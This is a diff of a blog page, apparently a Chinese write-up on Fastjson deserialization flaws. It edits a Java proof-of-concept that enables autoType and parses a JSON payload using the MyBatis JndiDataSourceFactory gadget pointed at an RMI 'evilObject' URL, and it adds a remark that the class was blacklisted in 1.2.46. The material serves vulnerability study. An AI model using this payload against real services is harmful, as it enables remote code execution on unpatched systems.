@@ -161,20 +161,14 @@ public class <span class="hljs-type">Fastjson4</span> {
 public class <span class="hljs-type">Fastjson5</span> {
     public <span class="hljs-keyword">static</span> <span class="hljs-type">void</span> main(<span class="hljs-type">String</span>[] args) throws <span class="hljs-type">Exception</span>{
         <span class="hljs-type">ParserConfig</span>.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);
-        <span class="hljs-type">String</span> payload = <span class="hljs-string">"{"</span> +
-                <span class="hljs-string">"\"seventeen\":{"</span> +
-                <span class="hljs-string">"\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\","</span> +
-                <span class="hljs-string">"\"dataSourceName\":\"rmi://127.0.0.1:1099/evilObject\","</span> +
-                <span class="hljs-string">"\"autoCommit\":true"</span> +
-                <span class="hljs-string">"}"</span> +
-                <span class="hljs-string">"}"</span>;
+        <span class="hljs-type">String</span> payload = <span class="hljs-string">"{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://127.0.0.1:1099/evilObject\"}}"</span>;
         <span class="hljs-type">JSON</span>.parse(payload);
     }
 }</code></pre>
                 	
                 	</div>
                 
-                
+                <p>&nbsp;&nbsp;&nbsp;但这个类在1.2.46被加入了黑名单。</p>
 
               
               
